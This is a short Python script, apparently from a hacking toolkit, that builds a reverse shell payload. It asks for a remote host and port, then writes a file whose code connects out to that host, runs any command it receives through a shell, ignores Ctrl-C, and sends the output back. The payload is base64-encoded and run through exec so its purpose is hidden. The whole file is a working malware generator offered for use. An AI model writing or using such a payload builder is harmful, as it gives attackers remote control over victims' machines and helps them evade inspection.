#CopyRight Apache-2.0
#Powered By Python 3.X
#Author : @Aμιρ-0x0 (AMJ)
import readline , os
from colorama import Fore
import base64
def PRM():
    try:
        ip = input (Fore.RESET+"RHOST > ")
        ip = "\"%s\""%(ip)
        print (Fore.CYAN+"\nRemote HOST > %s\n"%ip)
        port = int(input(Fore.RESET+"RPORT > "))
        print (Fore.CYAN+"\nRemote PORT > %s"%port)
        name = input (Fore.RESET+"\nEnter File Name :")
        print (Fore.CYAN+"\nName OF File > %s"%name)
        print (Fore.RESET+"")

        File = open(name,'w')
        T = 'import socket'
        T += '\nimport os'
        T += '\nimport subprocess,signal'
        T += '\ns = socket.socket()'
        T += '\ns.connect((%s,%s))'%(ip,port)
        T += '\ndef controlc_signal(signal,frame):'
        T += '\n\tpass'
        T += '\nsignal.signal(signal.SIGINT,controlc_signal)'
        T += '\nwhile True:'
        T += '\n\tdata = s.recv(1024)'
        T += '\n\tcd = "cd"'
        T += '\n\tif data[:2].decode("utf-8") == %s:'%'cd'
        T += '\n\t\tos.chdir(data[3:].decode("utf-8"))'
        T += '\n\tif len(data) > 0:'
        T += '\n\t\tcmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)'
        T += '\n\t\toutput_byte = cmd.stdout.read() + cmd.stderr.read()'
        T += '\n\t\toutput_str = str(output_byte,"utf-8")'
        T += '\n\t\tcurrentWD = "> "'
        T += '\n\t\ts.send(str.encode(output_str + currentWD))'

        cmd = base64.b64encode(bytes(T, 'utf-8')) 
        cmd = cmd.decode("utf-8")

        T1 = "import base64\n"
        T1 += "exec(base64.b64decode('%s'))"%cmd
        File.write(T1)
        File.close()

    except:
        print("Unknown Error !")


def RSMaker():
    PRM()
